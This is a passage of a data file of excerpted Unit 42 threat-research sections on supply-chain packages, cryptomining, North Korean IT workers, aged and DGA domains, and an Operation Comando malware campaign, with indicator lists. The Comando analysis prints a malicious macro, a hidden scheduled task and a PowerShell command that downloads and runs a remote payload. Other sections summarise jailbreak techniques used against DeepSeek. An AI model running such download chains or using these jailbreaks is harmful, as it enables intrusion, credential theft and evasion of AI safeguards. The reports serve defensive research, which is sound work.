security, defenders should pay particular attention to using best practices recommended by your CSP, and also to ensuring that your configuration matches your security needs.\nEmploying both agent and agentless solutions is an effective way to detect the hybrid tactics of attackers who combine traditional and cloud-based techniques for lateral movement. The cloud lateral movement techniques illustrated in this article highlight the importance of having a comprehensive security approach to effectively address the challenges inherent in cloud environments.\nPalo Alto Networks customers receive better protection from these attacks through the following products:", "source": "Palo"}, {"title": "Introduction", "content": "In March 2023, Unit 42 researchers discovered six malicious packages on the Python Package Index (PyPI) package manager. The malicious packages were intended to steal Windows users' application credentials, personal data and tracking information for their crypto wallets. The attack was an attempted imitation of the attack group W4SP, which had previously launched several supply chain attacks using malicious packages.\nWe will discuss the ease with which threat actors can use malicious packages to release malicious code in an open-source ecosystem. The behavior we observed is not an organized campaign planned by an attack group, but most likely an imitator who read technical reports of previous campaigns to execute their own attack. We will walk through a technical analysis of the malicious code and unravel what the threat actor tried to achieve in the attack.\nWe will describe the indicators used by Palo Alto Networks Prisma Cloud modules that identified the malicious packages discussed here. Palo Alto Networks customers receive protections from open-source packages containing malicious code via Prisma Cloud.", "source": "Palo"}, {"title": "Conclusion", "content": "The rise and prevalence of open-source software and the proliferation of package managers have made it easier than ever for attackers to slip these dangerous packages into unsuspecting systems. With software becoming increasingly pervasive in our daily lives, the threat of malicious packages has become more significant. Attackers can disguise these packages as legitimate software and exploit vulnerabilities in unsuspecting systems, causing significant damage such as data theft, system shutdown and network control.\nTo combat this threat, software developers and organizations must prioritize software security in their development process. Implementing robust security measures, such as code reviews, automated testing and penetration testing can help identify and remediate vulnerabilities before deployment. Additionally, staying up to date with security patches and updates can prevent attackers from exploiting known vulnerabilities.\nIn addition to technical measures, increasing awareness and education around software security can also help mitigate the risk of malicious packages. Regular training for developers, IT staff and end users on best security practices (e.g., password hygiene and suspicious email identification) can help prevent successful attacks. The collective effort of security professionals, developers and end users is necessary to ensure that malicious packages are identified and prevented from causing harm to systems and networks.\nPublishing technical reports about malware and malicious packages also plays a critical role in advancing our understanding of these threats and improving our ability to protect against them. Technical reports provide an in-depth analysis of the behavior and functionality of malware, which helps researchers and security professionals develop more effective countermeasures. Additionally, sharing technical details about malware can help organizations stay up to date with the latest threats and vulnerabilities, allowing them to improve their security posture and reduce the risk of cyberattacks.", "source": "Palo"}, {"title": "Introduction", "content": "On the official Coinhive homepage, we found detailed documentation on how to integrate the mining scripts onto any given website. Owners can use the easy version:\nor more complicated version that gives control over how the end user's CPU time should be used, e.g. how many threads, should the mining throttle.\nHigher thread number and/or lower throttle number will result in more CPU usage in client's browser. With higher CPU occupation percentage, end users will likely experience sluggish behavior and poor experience on the websites.", "source": "Palo"}, {"title": "Summary", "content": "AsAdGuardhas pointed out, the use of coinhive or similar mining services is itself not a malicious activity, it ishowthey are used that makes the sites malicious. Unfortunately, for the sites that we were able to observe engaging in crypto-mining activities, none of them has prompted the user with any sort of warning, let alone providing the kill switch for mining. With Bitcoin soaring over $5K (at time of writing), we can only expect more of such services spawning from everywhere. To protect yourself from this fast-growing threat, we recommend two options:\nPalo Alto Networks is blocking URLs hosting the Coinhive JavaScript files through PANDB, which can be enforced as part of the malware category, as these scripts are consuming system resources without the users' knowledge or consent. \nIn addition, popular browser plugins such as Adblock plus or Adguard will also block such mining scripts. Combine it with our firewall solution, you can rest assured that your previous CPU time and electricity is not exploited by sneaky scripts. \nUsers interested in top-ranked .bid, .download, and .website Domains hosting Coinhive script files included in this analysis can access themhere.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers identified a North Korean IT worker activity cluster that we track as CL-STA-0237. This cluster was involved in recent phishing attacks using malware-infected video conference apps. It likely operates from Laos, using Lao IP addresses and identities.\nCL-STA-0237exploited a U.S.-based, small-and-medium-sized business (SMB) IT services company to apply for other jobs. In 2022, CL-STA-0237 secured a position at a major tech company.\nWe believe CL-STA-0237 is another cluster of a broader network of North Korean IT workers supporting the nation's illicit activities, including weapons of mass destruction (WMD) and ballistic missile programs. This article highlights the IT workers' shift from stable income-seeking activities to involvement in more aggressive malware campaigns. Additionally, the article illustrates the global reach of North Korean IT workers.\nTo address these risks, organizations should perform the following activities:\nStrengthening their hiring screening processes \nImplementing robust monitoring to identify insider threats \nThoroughly evaluating outsourced services \nEnsuring that employees do not use corporate machines for personal activities\nPalo Alto Networks customers receive better protection from malware discussed in this article throughCortex XDRandXSIAMandPrisma Cloud.Advanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "North Korean threat actors have been highly successful in generating revenue to fund their nation's illicit activities. They began by posing as fake IT workers to secure consistent income streams, but they have begun transitioning into more aggressive roles, including participating in insider threats and malware attacks.\nThe continuous discovery of such operations highlights the vast scale of the threat. Despite numerous reports, media coverage and law enforcement efforts, these campaigns have not diminished. We anticipate that North Korean job-related campaigns will likely persist and even escalate.\nTo mitigate these risks, organizations mustenhance their screening processesfor new hires. This includes the following activities:\nBolstering monitoring to detect insider threats \nCarefully vetting outsourced services \nEnsuring that employees do not use corporate machines for personal activities\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nCortex XDRandXSIAMcustomers, users of both cloud and on-premises agents, receive protections out-of-the-box. Cortex's XSIAM AI-assisted operations centralize data and SOC detection and response capabilities, providing protections from the advanced threats described in this article. \nPrisma Cloudcustomers are protected out-of-the-box should the infection chains discussed within this article expose cloud infrastructure. Prisma Cloud monitors CI/CD pipelines, Cloud Secret Managers, Infrastructure as Code (IaC) templates and Software Composition to ensure that malicious execution, creation, modification or deletion of cloud resources are detected and remediated. \nAdvanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Domains\neffertz-carroll[.]com \nregioncheck[.]net \nfreeconference[.]io \nipcheck[.]cloud \nmirotalk[.]io \nmirotalk[.]net \nftpserver0909[.]com\nIP Address\n167.88.36[.]13\nEmail Addresses\nadonis_eros@outlook[.]com \nbrightstar1116@outlook[.]com \nbuyerlao@outlook[.]com \ncasey_qadir@outlook[.]com \ncescernand@outlook[.]com \ndevstar1116@gmail[.]com \nebcappservices@gmail[.]com \nhakajakin@outlook[.]com \nideationbrand@gmail[.]com \nlegend_dev@outlook[.]com \nliko.sonexarth@gmail[.]com \nliko.sonexarth@hotmail[.]com \nlongines0924@gmail[.]com \nlujindane@outlook[.]com \nmatthewhall14541@gmail[.]com \nniko.sonexarth@gmail[.]com \nniko.sonexarth@hotmail[.]com \noscar.vetres127@europe[.]com \noscar.vetres127@gmail[.]com \npinefirst@outlook[.]com \nreply9998@gmail[.]com \nrichard.stewart.1202@gmail[.]com \nrichard.stewart.1202@outlook[.]com \nsniper_bruce@outlook[.]com \nstp.walsh33@gmail[.]com \ntechcare127@gmail[.]com \ntruepai415@gmail[.]com \ntruestar222@outlook[.]com \nvolodimir.work2020@gmail[.]com \nzhangming_k@yahoo[.]com \nzhuming1116@gmail[.]com \nlisettekolson8@gmail[.]com \n312011217@qq[.]com \nalhinglovena3000@gmail[.]com \njumphon2103@gmail[.]com \nmobilephetjum@gmail[.]com \nphetchamphone1998@gmail[.]com", "source": "Palo"}, {"title": "Introduction", "content": "Since the end of August 2023, we have observed a significant rise in compromised servers specializing in clickbait and ad content. But why are sites like this such an attractive target for criminals? Mainly because these sites are designed to reach a large number of potential victims. Furthermore, clickbait sites often use outdated or unpatched software, making them vulnerable to compromise.\nThis article educates readers on the dangers of clickbait articles. We discuss how clickbait sites increase traffic for ad revenue. Additionally, we review a strategy to detect vulnerable clickbait sites based on the characteristics of their web traffic. Finally, we reveal trends on the recent jump in compromised clickbait sites based on exploitation ofCVE-2023-3169.\nPalo Alto Networks customers receive protection from compromised clickbait sites through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,DNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "When reviewing compromised website indicators from our telemetry, we continue to see a large volume of compromised clickbait and ad sites when compared with other categories. We explored some of the reasons behind that trend in this article.\nWith the potential to reach a large number of victims, these sites often use out-of-date or unpatched software, making them an attractive target for threat actors. As a result, clickbait articles are inherently risky. Readers should be aware of this risk and adjust their browsing habits accordingly.\nPalo Alto Networks customers receive protection from these threats through products likeCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeWildFire,Advanced Threat PreventionandAdvanced URL Filtering.\nNext-Generation Firewall with the Advanced Threat Prevention security subscription can help block the attacks with best practices via the following Threat Prevention signature:94459.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks has released \"Securing GenAI: A Comprehensive Report on Prompt Attacks: Taxonomy, Risks, and Solutions,\" which surveys emerging prompt-based attacks on AI applications and AI agents. While generative AI (GenAI) has many valid applications for enterprise productivity, there is also potential for critical security vulnerabilities in AI applications and AI agents.\nThe whitepaper comprehensively categorizes attacks that can manipulate AI systems into performing unintended or harmful actions - such asguardrail bypass,information leakageandgoal hijacking. In the appendix, it details the success rates for these attacks \u2013 certain attacks can be successful as often as 88% of the time against certain models, demonstrating the potential for significant risk to enterprises and AI applications.\nTo address these evolving threats, we introduce:\nA comprehensive, impact-focused taxonomy for adversarial prompt attacks \nMapping for existing techniques \nAI-driven countermeasures\nThis framework helps organizations understand, categorize and mitigate risks effectively.\nAs AI security challenges grow, defending AI with AI is critical. Our research provides actionable insights for securing AI systems against emerging threats.\nThe article below provides a condensed version of the full paper, showing the taxonomy and covering the key points. For a more detailed version of these concepts, as well as references, please refer to \"Securing GenAI: A Comprehensive Report on Prompt Attacks \u2013 Taxonomy, Risks and Solutions.\"\nPalo Alto Networks offers a number of products and services that can help organizations protect AI systems, including:\nAI Runtime Security \nAI Access Security \nAI Security Posture Management (AI-SPM) \nUnit 42'sAI Security Assessment\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "This article has introduced a comprehensive, impact-based taxonomy of adversarial prompt attacks, providing a framework for classifying both existing and emerging threats. By establishing a clear and adaptable taxonomy, we aim to empower the GenAI ecosystem to effectively map, understand and mitigate the risks posed by adversarial prompt attacks.\nFor GenAI application developers, this article highlights the critical importance of designing secure applications and conducting thorough testing before public deployment. Awareness of the techniques and impacts of adversarial prompt attacks will enable developers to build systems that are resilient to evolving threats.\nFor GenAI users, particularly enterprise users, this article serves as a guide to recognizing the risks of adversarial prompt attacks. By remaining vigilant and cautious when interpreting the outputs of GenAI applications, users can minimize the potential consequences of such attacks.\nEnterprise network administrators and policymakers will gain valuable insights into the security risks associated with adversarial prompt attacks. Equipped with this understanding, they can better secure their environments by carefully evaluating GenAI applications, implementing robust policies and managing risks effectively. When attacks occur, they will be better prepared to assess the impacts and take remediation actions.\nRobust security solutions can help organizations address these challenges by providing capabilities such as:\nEnhanced visibility and control over GenAI systems \nModel and dataset protection \nAdaptive defense against evolving attacks \nZero-day threat prevention within the enterprise\nThese solutions can help detect potential data exposure risks and manage overall security posture. Please refer tothe Unit 42 Threat Frontier: Prepare for Emerging AI Riskson how adversaries can leverage GenAI and how Unit 42 can help defend your organization.\nBy leveraging these tools and the insights shared in this blog, stakeholders across the GenAI ecosystem can confidently navigate the evolving threat landscape and secure their applications, networks and data against adversarial prompt attacks.\nAgain, please refer to the full prompt attack whitepaper \"Securing GenAI: A Comprehensive Report on Prompt Attacks: Taxonomy, Risks, and Solutions\" for more technical insights.\nPalo Alto Networks offers products and services that can help organizations protect AI systems:\nAI Runtime Securityis an adaptive, purpose-built solution that discovers, protects and monitors the entire enterprise application and agent stack including models and data from AI-specific and foundational network threats. \nAI Access Securityoffers comprehensive visibility and control over GenAI usage in enterprise environments, helping detect potential data exposure risks and strengthening the overall security posture. \nAI Security Posture Management (AI-SPM)enables rapid GenAI application development by reducing risk in the AI application stack and supply chain. \nUnit 42'sAI Security Assessmentprovides recommended security best practices and helps you proactively identify the threats most likely to target your AI environment.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers recently revealed two novel and effective jailbreaking techniques we callDeceptive DelightandBad Likert Judge. Given their success against other large language models (LLMs), we tested these two jailbreaks and another multi-turn jailbreaking technique calledCrescendoagainst DeepSeek models. We achieved significant bypass rates, with little to no specialized knowledge or expertise being necessary.\nA China-based AI research organization named DeepSeek has released two open-source LLMs:\nDeepSeek-V3was released on Dec. 25, 2024 \nDeepSeek-R1was released in January 2025\nDeepSeek is a notable new competitor to popular AI models. There are several model versions available, some that are distilled from DeepSeek-R1 and V3.\nFor the specific examples in this article, we tested against one of the most popular and largest open-source distilled models. We have no reason to believe the web-hosted versions would respond differently.\nThis article evaluates the three techniques against DeepSeek, testing their ability to bypass restrictions across various prohibited content categories. The results reveal high bypass/jailbreak rates, highlighting the potential risks of these emerging attack vectors.\nWhile information on creating Molotov cocktails, data exfiltration tools and keyloggers is readily available online, LLMs with insufficient safety restrictions could lower the barrier to entry for malicious actors by compiling and presenting easily usable and actionable output. This assistance could greatly accelerate their operations.\nOur research findings show that these jailbreak methods can elicit explicit guidance for malicious activities. These activities include data exfiltration tooling, keylogger creation and even instructions for incendiary devices, demonstrating the tangible security risks posed by this emerging class of attack.\nWhile it can be challenging to guarantee complete protection against all jailbreaking techniques for a specific LLM, organizations can implement security measures that can help monitor when and how employees are using LLMs. This becomes crucial when employees are using unauthorized third-party LLMs.\nThe Palo Alto Networks portfolio of solutions, powered byPrecision AI, can help shut down risks from the use of public GenAI apps, while continuing to fuel an organization's AI adoption. TheUnit 42 AI Security Assessmentcan speed up innovation, boost productivity and enhance your cybersecurity.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Our investigation into DeepSeek's vulnerability to jailbreaking techniques revealed a susceptibility to manipulation. The Bad Likert Judge, Crescendo and Deceptive Delight jailbreaks all successfully bypassed the LLM's safety mechanisms. They elicited a range of harmful outputs, from detailed instructions for creating dangerous items like Molotov cocktails to generating malicious code for attacks like SQL injection and lateral movement.\nWhile DeepSeek's initial responses often appeared benign, in many cases, carefully crafted follow-up prompts often exposed the weakness of these initial safeguards. The LLM readily provided highly detailed malicious instructions, demonstrating the potential for these seemingly innocuous models to be weaponized for malicious purposes.\nThe success of these three distinct jailbreaking techniques suggests the potential effectiveness of other, yet-undiscovered jailbreaking methods. This highlights the ongoing challenge of securing LLMs against evolving attacks.\nAs LLMs become increasingly integrated into various applications, addressing these jailbreaking methods is important in preventing their misuse and in ensuring responsible development and deployment of this transformative technology.\nPalo Alto Networks Protection and Mitigation\nWhile it can be challenging to guarantee complete protection against all jailbreaking techniques for a specific LLM, organizations can implement security measures that can help monitor when and how employees are using LLMs. This becomes crucial when employees are using unauthorized third-party LLMs.\nThe Palo Alto Networks portfolio of solutions, powered byPrecision AI, can help shut down risks from the use of public GenAI apps, while continuing to fuel an organization's AI adoption. TheUnit 42 AI Security Assessmentcan speed up innovation, boost productivity and enhance your cybersecurity.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Since theSolarWinds supply chain attack(SUNBURST trojan) was disclosed in October 2020, Palo Alto Networks has continuously investigated the campaign to expose any of its characteristics that could help detect generic advanced persistent threats (APTs). One of the interesting findings is that the attackers registered the command and control (C2) domain years before they launched intense penetration activities on the domain. This behavior is typical for APT attacks because these actors often penetrate networks broadly and then focus more effort on high-value targets \u2013 their trojans usually stay dormant in victims' networks before the operators decide on targets and exploit them actively. However, attackers gain a benefit from using strategically aged domains \u2013 domains registered in advance sometimes take longer to detect when they begin malicious activity because they've developed a benign reputation over time. Other actors engaged in network abuses such as phishing and black hat search engine optimization (SEO) can also deploy campaigns with aged domains to benefit from the reputation built by their long lifetime. Besides, attackers usually register multiple domains in advance so that they can resume the malicious service to the backup domains quickly if the primary entry point is blocked.\nMalicious dormant domains will present abnormally sudden traffic increments when they are involved in active campaigns. Therefore, we launched a cloud-based detector to monitor domains' activities and identify these strategically aged domains. It extracted about 30,000 domains every day from fine-grained passive domain name system (DNS) data. These domains typically have limited traffic for months to years and then gain more than 10.3 times the traffic increment within one day. Their malicious rate is more than three times higher than that ofnewly registered domains(NRDs). And 22.27% of them are malicious, suspicious or not safe for work.\nDuring the SolarWinds supply chain attack, the trojan employed domain generation algorithms (DGA) to exfiltrate the identities of target machines with subdomains. To uncover similar APT attacks, we scan all hostnames of strategically aged domains and recognize those that activate with a significant amount of emerging DGA subdomains as potential attacking domains. Each of these potential attacking domains generated about 161 DGA subdomains to carry 43.19% of their burst traffic. As they are identified, these suspicious domains are released toPalo Alto Networks Next-Generation Firewallsecurity subscriptions, includingDNS Security. Here, we present several cases of various network abuses captured by our system.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors can register domains long before using them for attacking campaigns. For example, APT malware can stay dormant for years and then suddenly activate and produce a large amount of exploiting traffic through their C2 domains. Our advanced cloud-based passive DNS system enables us to identify domains presenting abnormal traffic increment patterns as strategically aged domains. These domains have a higher malicious percentage compared to NRDs. We also developed a detector to recognize malicious strategically aged domains based on their traffic distribution and subdomains' characteristics. These suspicious domains could leverage DGA to exfiltrate data through DNS traffic, provide proxy layers ahead of the attacking services and createlevelsquattinghostnames.\nAt Palo Alto Networks, our strategically aged domain and DGA subdomain detection system monitors passive DNS trend data to expose potential attacks. To protect our customers, the system releases the detection results with the grayware category to Palo Alto NetworksNext-Generation Firewallsecuritysubscriptionsin real time.", "source": "Palo"}, {"title": "Indicators", "content": "avsvmcloud[.]comfiorichiari[.]comgjahqfcyr[.]cnimgdsg4f35.permalinking[.]comjcxivnmqfqoiopdlvejvgucpmrfgmhwdlrkvzqyb.ui1io[.]cnmailingmarketing[.]netopposedarrangement[.]netpermalinking[.]comphp78mp9v.opposedarrangement[.]netui1io[.]cnuk.id.login.update.ssl.encryption-6159368de39251d7a-login.id.security.trackid.piwikb7c1867dd7ba9c57.fd685e42f1d69c71708ff549fea71274.mailingmarketing[.]net", "source": "Palo"}, {"title": "Introduction", "content": "We have uncovered a new campaign in which an attacker leverages newly registered domains (NRDs) and introduces a new variant of domain generation algorithms (DGAs) potentially designed to avoid detection. We found this through our novel graph-intelligence based pipeline. The system infers attack campaigns by correlating domain registrations with hosting infrastructure, passive DNS and WHOIS data.\nThis campaign used over 6,000 NRDs that redirected to similar paths on domains resembling those generated by dictionary-based DGAs. Dictionary DGAs are a DGA variant that combines dictionary words to create domain names resembling legitimate ones, thus hindering detection by security systems.\nThese NRDs redirected users to URLs that lead to advertisements of potentially unwanted Android applications. Analysis of files contacting the NRDs' IP address revealed that 96% (89 of 92) were malicious.\nBroadening the scope of our investigation, we found that there were 444,898 NRDs belonging to the same actor. These NRDs redirected to 178 domains exhibiting dictionary DGA-like characteristics.\nWe identified a new pattern in these 178 domains, which we call typo DGAs: dictionary DGA domains containing typographical errors. For example,pictidentifyive[.]prois a typo DGA that could be a combination of the words \"picture,\" \"identify\" and \"five\" with some letters deleted. This typo DGA pattern suggests a new dictionary DGA variant designed to evade traditional detection methods.\nPalo Alto Networks customers are better protected through the following products and services:\nAdvanced URL FilteringandAdvanced DNS Securityidentify known domains and URLs associated with this activity as malicious.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Our analysis revealed a campaign using typo DGAs, which is a novel dictionary DGA variant designed to evade detection. This campaign highlights the need for advanced detection capabilities like our graph intelligence pipeline. We are actively monitoring and blocking the malicious infrastructure in the campaign we described (tracked as'typodga_redir').\nPalo Alto Networks customers are better protected through the following products and services:\nAdvanced URL FilteringandAdvanced DNS Securityidentify known domains and URLs associated with this activity as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Our telemetry for this campaign identified email as the primary delivery mechanism and found the first related samples were distributed in August 2018. Topics used by the actor are typically related to travel bookings and vouchers, and target mainly Brazilian victims. Table 1 shows a representative list of typical subjects and attachment names found during the campaign.\nTable 1 Some email subjects and attachment names representative of this campaign.\nWhile investigating the malicious documents used in the campaign, we discovered an interesting consistency in the document metadata. The author consistently uses an acronym throughout their work - \"C.D.T Original\" (see details on Figure 1).\nFigure 1 Example of malicious document metadata\nThe attackers make use of multiple common off-the-shelf methods that are observed in many campaigns, such as external references to remote scripts executed by MSHTA. Following this approach, this actor can find multiple tools and resources to perform their activities, and at the same time, make attribution and tracking more difficult for analysts. The most prevalent combinations of methods observed are depicted in Figure 2.\nFigure 2 Multiple delivery mechanisms.\nAs an example of an email delivery used during December 2018 campaigns, let's look at what pretended to be a rooming list (SHA256:ac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187), which follows one path from Figure 2, more precisely the steps described in Figure 3.\nFigure 3 December 2018 campaign delivery example\nThe malicious documents contain a simple Macro, which executes a remotely-hosted script using MSHTA:\nPublic Sub Auto_Open()\nvar0 = \"MSHTA https://bit[.]ly/2QXNTHi\"\nVar = var0\nShell (Var)\nEnd Sub\nThe landing URL resolves to:\nhxxps://internetexplorer200[.]blogspot[.]com/\nThe statistics for the URL-shortened link on bit.ly confirm the observations from our telemetry, showing targets mainly in Brazil, as depicted in Figure 4 Distribution of Bit.ly campaign on 27-28th December.\nFigure 4 Distribution of Bit.ly campaign on 27-28th December\nMSHTA executes VBScript contents that are encoded/obfuscated using a very simple algorithm (note the presence of Portuguese words throughout the code).\nFigure 5 First stage VBScript code run via MSHTA\nThis results in the following scheduled task created in the system, where a new second-stage script is invoked via MSHTA from another remote location. Note that the second-stage VB code contains a reference to \"CDT\" in a comment.\n\"set shhh = CreateObject(\\\"WScript.Shell\\\")\\r\\n   Dim var1\\r\\n var1 = \\\"cmd.exe /c SchTasks /Create /sc MINUTE /MO 240 /TN AdobeUpdateSD /TR \\\"\\\".exe https://minhacasaminhavidacdt.blogspot[.]com/\\\"\\r\\nshhh.run var1, vbHide\\r\\n\"\nFigure 6 Second-stage VB script\nThis second-stage VBScript code ends up loading a final payload in memory via PowerShell reflection, fetching the binary content from a file with a GIF extension:\n\"CreateObject(\\\"Wscript.Shell\\\").run  \\\"cmd.exe /c powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -command [Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://achoteis.com[.]br/images/64.gif'))).EntryPoint.Invoke($null,$null)\\\"\\r\\n\"\nThe final payload delivered in this case is Revenge Remote Access Trojan (RAT), a commodity tool which can be used to facilitate information theft.", "source": "Palo"}, {"title": "Conclusion", "content": "Operation Comando is a pure cybercrime campaign, possibly with Brazilian origin, with a concrete and persistent focus on the hospitality sector, which proves how a threat actor can be successful in pursuing its objectives while maintaining a cheap budget. The use of DDNS services, publicly available remote access tools, and having a minimum knowledge on software development (in this case VB.NET) has been enough for running a campaign lasting month, and potentially gathering credit card information and other possible data.\nWhile cybercrime campaigns like this remain active, Palo Alto Networks customers are protected from these threats in the following ways:\nWildFire detects all malicious documents and payloads delivered as malware. \nAutoFocus customers can track this campaign using the following tag:OperationComando \nTraps blocks all of the files associated with this campaign.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visitcyberthreatalliance.org.", "source": "Palo"}, {"title": "Indicators", "content": "Infrastructure\nfejalconstrucoes[.]com[.]br\ninternetexplorer200[.]blogspot[.]com\noffice365update[.]duckdns[.]org\nolhomagicocdt[.]duckdns[.]org\n498408[.]ddns[.]net\nSystenfailued[.]ddns[.]com[.]br\ninternetexploter[.]duckdns[.]org\nssl9294[.]websiteseguro[.]com\nfejalconstrucoes[.]com[.]br\nc-d-t[.]weebly[.]com\nMalicious documents\n55732ba1b1e94add5e75e90d5eba137bfbfbd35e537b8d5c9a01365f5a6407d7\n7f13f449c80cc003d369c6b6002fd4912788e014ce35e97b29ba168136c6ece6\n47c471da52aa808250357c4638078c9e13797bb6a8a8b169d4b33d95ff230e89\n0c85b2ebc7c5316b7878239daf6a611fc2d0a05966f541e83e19db96f41fd3aa\n62f82e636924980b622204368f586723feb82594ce256e2e65ac5307fd67d669\n1c637cf4276b589f1b2806a77310b90c214cd0b026e4ec69448887be331ba5b3\nd96eaf8f22ec5cb9edba6369f9980efc8b0f76bf35eaf92aa5cb5e03669ddd9f\n1df7ace77a7f146b1bbd5c881134083f886ea83017f4619a9e62a9743909cdd1\n03483d2e701f8f90c9cc46b37f12f1cef995e4cca4b5c4b9e67947f560275677\nac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187\n796c02729c9cd5d37976ddae205226e6339b64859e9980d56cbfc5f461d00910\nd67e160ccc6ac2fb8cd330e9fd53389fb1f99fad680d27045e5291e9d23d9317\n7f41ae21f3ad37505e5b3d0551caeb85bc9e07571d7d98acd3489b5db8ba6741\n3f3718b7e50eee8b0b3e4a4da8c5a0302623b5800eb7bc0718036f77a6ec72c0\na44e08b7ebd6bf73a9eb1b5a483987a1f0e3fdfe12b05a7a8f4ec1febfcf959e\n4211e091dfb33523d675d273bdc109ddecf4ee1c1f5f29e8c82b9d0344dbb6a1\nfd8781f125ac1ee68afb8dba61e17373ebe57bfd18850a01d41caaddde4cffcb\n269eb444415489a7898af36f1ba105129655226c98753d87afec651219e158c7\nee9d3c90df5c01dc6e2079d1219be752542a452988c4a25f34b8ee22be799332\n41b57429b00383f2b5d60fb22283b5c14a94ab8619c527e7d749e64b56d31518\nce44559beb4a5d52d962ab9e375970ef1d8e9f22a0be8c971b0244ebca61b2f2\nccd23e44662953d0837ca12728854bfd61f5ea14293a1620c3b48ba8f435a432\n57f31ef70a8b8b39659659abd0f1c8974fe23d2cbd2194d097375b2667a5424b\nf534f9b1cc64f03c32d59acdf9d58653bb0076798805af12e6cd914cbbfcf5fa\n846a89bbcf6c907fd915699a232c1f9acae0756fdc12c590198bfe65b4c90f44\n4f2ce6883b7057bde6baed2607e4645e4745db9ebfb20872e425944ba8ec3425\n722a2d8d4c1fb1e5195df50b159cdce0b05333acbb3ec90d24310331d21d2514\ne54bfccc796a4f779d332e535f78a5b118dbcd8a8971e39ac059ee9f069a1203\n4f4ea063d5bd22f1c57cdcf89d40339ddd5d5741c1b1dabfe52a474d70be9d04\nCapturaTela\nc7f3673ca116f76b16a7e00d81553abb0df02e75d4ac8fb6d3af52d351d9b46a\n904a4799edf642e6e685a137c88691f08b51643e539bea8de9e4cdf8c6251c7f\na03bc280123541518845cc167b4e812bbe9682696af4eeac041385cc0a00f5c6\nRATs\n2b343e0b0aa8de557fa11c9918f1b93ab6e88d9bd11565c587852d4d17bcf5a8\n57d83d5928bb8926718e732a85dd69dffe6ff61ff7edd9b843a50959f2fd1256\n33195ec463ba9d627a0c177eca366bbefa34306170449a5c0ef7661319ba2b05\n7eaea64fdfdc4f35ffe3036ee03f54c4aace204533a9d157faafa4a23221980c\ne76772ae83e2c79ed4aa80b5b7f4b42c46cea45ed1d15bd004b0dc71bfc41945\n977d940de630fff225e4917927d47100b75b56444c4117a22aa34b1450dc2930\n8a700793012385a706ef277f043bb5bf8a5ef877e3ba1fac3b5601df7fb36a30\nc740fe0dbf5aebf5f34e392a9bff0d4a19bf20ff553bb734574c2593ddcbbfa1\n10a7ba12b